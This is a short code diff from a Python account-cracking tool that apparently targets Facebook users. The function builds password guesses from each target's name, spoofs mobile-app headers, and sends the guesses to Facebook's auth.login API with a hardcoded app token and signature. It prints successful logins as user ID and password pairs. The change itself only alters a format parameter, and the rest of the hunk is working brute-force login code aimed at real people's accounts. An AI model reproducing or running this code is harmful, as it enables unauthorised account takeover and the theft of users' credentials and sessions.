@@ -275,7 +275,7 @@ def crack_select1():
 		try:
 			pass1 = name.lower().split(' ')[0] + name.lower().split(' ')[1]
 			headers_ = {'x-fb-connection-bandwidth': str(random.randint(20000000.0, 30000000.0)), 'x-fb-sim-hni': str(random.randint(20000, 40000)), 'x-fb-net-hni': str(random.randint(20000, 40000)), 'x-fb-connection-quality': 'EXCELLENT', 'x-fb-connection-type': 'cell.CTRadioAccessTechnologyHSDPA', 'user-agent': _azimua, 'content-type': 'application/x-www-form-urlencoded', 'x-fb-http-engine': 'Liger'}
-			data = session.get("https://b-api.facebook.com/method/auth.login?access_token=350685531728%7C62f8ce9f74b12f84c123cc23437a4a32&format=JSON&sdk_version=2&email="+uid+"&locale=en_US&password="+pass1+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6", headers=headers_).text
+			data = session.get("https://b-api.facebook.com/method/auth.login?access_token=350685531728%7C62f8ce9f74b12f84c123cc23437a4a32&format=json&sdk_version=2&email="+uid+"&locale=en_US&password="+pass1+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6", headers=headers_).text
                         q = json.loads(data)
 			if "access_token" in q and "EAAA" in q:
 				print(" \033[1;32m[AZIM-OK] "+uid+" | "+pass1+"\033[0;97m")
